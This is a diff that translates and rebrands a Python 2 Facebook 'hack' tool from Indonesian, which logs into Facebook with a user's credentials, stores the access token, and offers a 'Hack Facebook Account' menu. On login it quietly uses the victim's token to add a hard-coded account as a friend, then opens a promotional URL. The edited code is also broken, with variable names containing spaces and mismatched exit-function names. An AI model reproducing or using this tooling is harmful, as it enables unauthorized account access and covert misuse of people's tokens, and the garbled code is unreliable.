@@ -1,4 +1,4 @@
-#Note: HATI HATI SESI AKUNMU !
+#Note: اپنے اکاؤنٹ سیشن کے بارے میں محتاط رہیں!
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -11,12 +11,12 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-def keluar():
+def EXIT():
     print '\x1b[1;91m[!] Keluar'
     os.sys.exit()
 
 
-def jalan(z):
+def Jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
@@ -35,21 +35,21 @@ def tik():
 
 back = 0
 threads = []
-berhasil = []
-cekpoint = []
-gagal = []
-idteman = []
-idfromteman = []
+Success = []
+chekpoint = []
+Failed = []
+Friends ID = []
+id From A Friend = []
 idmem = []
 id = []
 em = []
-emfromteman = []
+emfromFriend = []
 hp = []
-hpfromteman = []
-reaksi = []
-reaksigrup = []
-komen = []
-komengrup = []
+hpfromFriend = []
+Reaction = []
+ReactionGroup = []
+Comment = []
+CommentGroup = []
 listgrup = []
 vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
@@ -64,15 +64,15 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[+] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[+]'
+        print '\x1b[1;91m[+] \x1b[1;92mLOGIN FACEBOOK ACCOUNT \x1b[1;91m[+]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak ada koneksi'
-            keluar()
+            print '\n\x1b[1;91m[!] CONNECTION PROBLEM'
+            EXIT()
 
         br._factory.is_html = True
         br.select_form(nr=0)
@@ -96,20 +96,20 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/c/GALKARDING')
+                os.system('xdg-open https://www.itechhacks1.blogspot.com')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                print '\n\x1b[1;91m[!] Connection Problem'
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mMampus kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93mMampus Account checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
-            keluar()
+            Exit()
         else:
-            print '\n\x1b[1;91m[!] Login Gagal'
+            print '\n\x1b[1;91m[!] Login Failed'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
@@ -121,7 +121,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token Not Found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -133,25 +133,25 @@ def menu():
             id = a['id']
         except KeyError:
             os.system('clear')
-            print '\x1b[1;91m[!] \x1b[1;93mMampus akun lo kena Checkpoint'
+            print '\x1b[1;91m[!] \x1b[1;93mMampus Account checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
-            keluar()
+            print '\x1b[1;91m[!] Connection Problem'
+            Exit()
 
     os.system('clear')
     print logo
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m1. User Information'
+    print '\x1b[1;37;40m2. Hack Facebook Account'
     print '\x1b[1;37;40m3. Bot               '
-    print '\x1b[1;37;40m4. Lainnya....       '
+    print '\x1b[1;37;40m4. Others....       '
     print '\x1b[1;37;40m5. LogOut            '
-    print '\x1b[1;31;40m0. Keluar            '
+    print '\x1b[1;31;40m0. Exit            '
     print
     pilih()
 
@@ -159,11 +159,11 @@ def menu():
 def pilih():
     zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
     if zedd == '':
-        print '\x1b[1;91m[!] Jangan kosong'
+        print '\x1b[1;91m[!] Do Not Empty'
         pilih()
     else:
         if zedd == '1':
-            informasi()
+            information()
         else:
             if zedd == '2':
                 menu_hack()
@@ -172,26 +172,26 @@ def pilih():
                     menu_bot()
                 else:
                     if zedd == '4':
-                        lain()
+                        Other()
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://www.youtube.com/c/GALKARDING')
-                            keluar()
+                            os.system('xdg-open https://www.itechhacks1.blogspot.com')
+                             Exit()
                         else:
                             if zedd == '0':
-                                keluar()
+                                Exit()
                             else:
-                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
+                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mThere is no'
                                 pilih()
 
 
-def informasi():
+def information():
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
